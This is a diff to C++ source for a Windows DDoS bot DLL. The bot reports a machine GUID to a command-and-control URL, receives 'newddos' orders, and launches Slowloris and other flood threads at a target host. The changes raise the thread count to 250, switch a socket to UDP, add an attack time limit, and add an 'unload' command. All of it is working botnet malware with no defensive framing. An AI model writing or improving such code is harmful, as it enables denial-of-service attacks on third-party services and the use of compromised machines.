@@ -10,6 +10,7 @@
 #include <sstream>
 #include <utility>
 #include <WinSock2.h>
+#include <ctime>
 #pragma comment(lib,"ws2_32.lib")
 #define MAX_PACKET_SIZE 4096
 #define RND_CHAR (char)((rand() % 26)+97)
@@ -107,7 +108,7 @@ extern "C"
 		sai = (sockaddr_in*)p;
 		while (1)
 		{
-			s = socket(AF_INET, SOCK_STREAM, IPPORT_BIFFUDP);
+			s = socket(AF_INET, SOCK_DGRAM, 0);
 
 			if (s != INVALID_SOCKET)
 			{
@@ -163,7 +164,8 @@ extern "C"
 			}
 		}
 	}
-		
+
+	/*
 	DWORD WINAPI TS3Thread(PVOID p)
 	{
 
@@ -178,16 +180,24 @@ extern "C"
 	{
 
 	}
-
+	*/
+	long int unix_timestamp()
+	{
+		time_t t = std::time(0);
+		long int now = static_cast<long int> (t);
+		return now;
+	}
 	__declspec(dllexport) void BackConnect(std::string url)
 	{
 		int n = 20;
 		std::thread hThread;
-		std::vector<HANDLE> threads(100);
+		std::vector<HANDLE> threads(250);
+		long int attackstartedTime = 0;
 		while (true) {
 			std::string post = "hwid=" + GetMachineGUID() + "&taskrunning=" + std::to_string(task1_running) + "&taskid=" + globalTaskIDRunning;
 			std::string response = postRequest(url, post);
 
+	
 			if (response.find("newddos") != std::string::npos) {
 				std::vector<std::string> v;
 
@@ -204,7 +214,7 @@ extern "C"
 				if (!task1_running) {
 					stopTask = false;
 					std::cout << "New Task \n";
-
+					attackstartedTime = unix_timestamp();
 					ULONG i;
 					hostent* host;
 					sockaddr_in sai;
@@ -232,7 +242,7 @@ extern "C"
 					sai.sin_addr.S_un.S_addr = *(PULONG)host->h_addr;
 					sai.sin_port = htons(strtoul(port.c_str(), NULL, 0));
 
-					for (i = 0; i < 100; i++)
+					for (i = 0; i < 250; i++)
 					{
 						if (method == "slow") {
 							threads[i] = CreateThread(NULL, 0, SlowlorisThread, &sai, 0, NULL);
@@ -257,9 +267,37 @@ extern "C"
 				}
 				
 				std::cout << "Kill Threads \n";
+
+				Sleep(10000);
+				continue;
+			}
+			else if (response == "unload") {
+				globalTaskIDRunning = "0";
+				task1_running = false;
+				stopTask = true;
+
+				for (auto& th : threads) {
+					TerminateThread(th, 0);
+					CloseHandle(th);
+				}
 				break;
 				return;
 			}
+
+
+			if (task1_running) {
+				if (unix_timestamp() >= (attackstartedTime + stoi(maxtime))) {
+					globalTaskIDRunning = "0";
+					task1_running = false;
+					stopTask = true;
+
+					for (auto& th : threads) {
+						TerminateThread(th, 0);
+						CloseHandle(th);
+					}
+				}
+			}
+
 			Sleep(2500);
 		}
 		return;
